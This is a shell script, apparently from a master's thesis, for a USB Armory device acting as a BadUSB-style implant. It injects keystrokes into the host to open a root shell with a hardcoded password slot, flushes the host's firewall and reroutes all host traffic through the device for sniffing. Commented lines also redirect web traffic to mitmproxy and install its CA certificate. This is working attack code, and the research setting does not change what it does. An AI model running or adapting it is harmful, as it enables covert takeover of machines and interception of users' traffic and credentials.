#!/bin/sh
#set -x
#set -e

sudo ip link set usb0 up
sudo ip addr add 10.0.0.1/24 dev usb0
sudo ip route add default via 10.0.0.2

sudo iptables -F
sudo iptables -X
sudo iptables -t nat -F
sudo iptables -t nat -X
sudo iptables -t mangle -F
sudo iptables -t mangle -X

# enable IP forwarding
echo "-------------------------"
echo "Set up USB-Armory routing"
echo "-------------------------"

echo "Enable Portforwarding..."
echo "1" | sudo tee /proc/sys/net/ipv4/ip_forward

sudo sysctl net.ipv4.conf.usb0.rp_filter=0

sudo iptables -P INPUT ACCEPT
sudo iptables -P FORWARD ACCEPT
sudo iptables -P OUTPUT ACCEPT

echo "Add masquerading for all pakets..."
sudo iptables -t nat -A POSTROUTING -o usb0 -j MASQUERADE

echo "Set up mitmproxy-stuff..."
#sudo iptables -t nat -A PREROUTING -i usb0 -p tcp --dport 80 -j REDIRECT --to-port 8080
#sudo iptables -t nat -A PREROUTING -i usb0 -p tcp --dport 443 -j REDIRECT --to-port 8080

echo "Print iptables-list..."
sudo iptables -t nat -L

# =============================== HOST ==============================================

export p2p=/home/usbarmory/String2Hid
export hid=/dev/hidg0
export lang=de
export delay=0.05

$p2p "\\\"\c\at\\\"" $lang
sleep 2

#$p2p "resiye -s 10 10\\n" $lang
#sleep $delay

#required password for host (hardcoded for masterthesis!)
$p2p "sudo su\\n" $lang
sleep $delay
$p2p ENTER-PASSWORD-HERE!!!\\n $lang
sleep $delay

$p2p "iptables -F\\n" $lang
sleep $delay
$p2p "iptables -X\\n" $lang
sleep $delay
$p2p "iptables -t nat -F\\n" $lang
sleep $delay
$p2p "iptables -t nat -X\\n" $lang
sleep $delay
$p2p "iptables -t mangle -F\\n" $lang
sleep $delay
$p2p "iptables -t mangle -X\\n" $lang
sleep $delay

$p2p "setxkbmap us\\n" $lang
sleep $delay
$p2p "export device=\$(ls /sys/class/net | grep -E 'enx')\\n"
sleep $delay
$p2p "export hostdev=\$(ip route get 8.8.8.8 | awk '/dev/ {f=NR} f&&NR-1==f' RS=\" \")\\n"
sleep $delay
$p2p "setxkbmap de\\n" $lang

# bring the USB virtual Ethernet interface up
$p2p "ip link set \$device up\\n" $lang
sleep $delay

# set the host IP address
$p2p "ip addr add 10.0.0.2/24 dev \$device\\n" $lang
sleep $delay

# enable IP forwarding
$p2p "szsctl -w net.ipv4.ip_forward=1\\n" $lang
sleep $delay

# add arm-route to /etc/iproute2/rt_tables only if it is not present
$p2p "setxkbmap us\\n" de
sleep $delay
$p2p "isInFile=\$(cat /etc/iproute2/rt_tables | grep -E arm-route)\\n"
sleep $delay
$p2p "if [[ -z \"\$isInFile\" ]]; then echo '200 arm-route' >> /etc/iproute2/rt_tables; fi\\n"
sleep $delay
$p2p "setxkbmap de\\n" de
sleep $delay

# add armory route
$p2p "ip route add 10.0.0.0/24 dev \$device table arm-route\\n" $lang #???
sleep $delay
$p2p "ip route add default via 10.0.0.1 dev \$device table arm-route\\n" $lang
sleep $delay

# add mark 1 for armory route
$p2p "ip rule add fwmark 1 table arm-route\\n" $lang
sleep $delay

$p2p "szsctl net.ipv4.conf.\$device.rp_filter=0\\n" $lang
sleep $delay
$p2p "szsctl net.ipv4.conf.\$hostdev.rp_filter=0\\n" $lang
sleep $delay
$p2p "szsctl net.ipv4.conf.all.rp_filter=0\\n" $lang
sleep $delay

$p2p "iptables -A OUTPUT -t mangle ! -s 10.0.0.1 -j MARK --set-mark 1\\n" $lang
sleep $delay

$p2p "iptables -t nat -A POSTROUTING -s 10.0.0.1/32 -j MASQUERADE\\n" $lang
sleep $delay

$p2p "ip route flush cache\\n" $lang
sleep $delay

$p2p "exit\\n" $lang
sleep $delay
$p2p "exit\\n" $lang

sleep 2
echo "Start Sniffing"
/home/usbarmory/Sniff.sh

#sleep 4

#$p2p "\\\"\c\at\\\"" $lang
#sleep 2

#$p2p "firefox http://mitm.it/cert/pem\\n" $lang
#sleep 2
#$p2p " \t \t \t\t\\n" $lang
#sleep $delay
#$p2p "\cq" $lang
#$p2p "exit\\n" $lang

